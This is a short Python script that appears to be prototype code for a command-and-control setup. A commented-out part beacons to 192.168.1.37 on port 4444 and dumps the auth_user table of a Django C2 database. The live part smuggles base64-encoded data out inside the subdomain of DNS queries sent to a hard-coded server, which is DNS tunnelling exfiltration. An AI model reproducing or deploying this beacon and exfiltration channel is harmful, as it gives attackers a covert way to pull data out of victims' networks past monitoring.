'''import socket
import datetime

host = '192.168.1.37'
port = 4444

clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect((host, port))

resp = ("Windows ->"+str(datetime.datetime.now()))
clientsocket.send(resp.encode('ascii'))

clientsocket.close()

import sqlite3

conn = sqlite3.connect("..\C2_Django\db.sqlite3")
cursor = conn.cursor()

print(cursor.execute("SELECT * from auth_user;").fetchall())
'''
import dnslib
import socket
import base64


dns_server = '10.121.100.63'
domain_name = 'southpark.com'
data = 'shithousery'

encoded_data = base64.b64encode(data.encode())
encoded_data_str = str(encoded_data).strip("'-b")

# Add the encoded data to the subdomain
query = dnslib.DNSRecord.question(encoded_data_str + '.' + domain_name)

# Send the DNS query to the DNS server
dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
dns_socket.sendto(query.pack(), (dns_server, 53))

response = dnslib.DNSRecord.parse(dns_socket.recv(4096))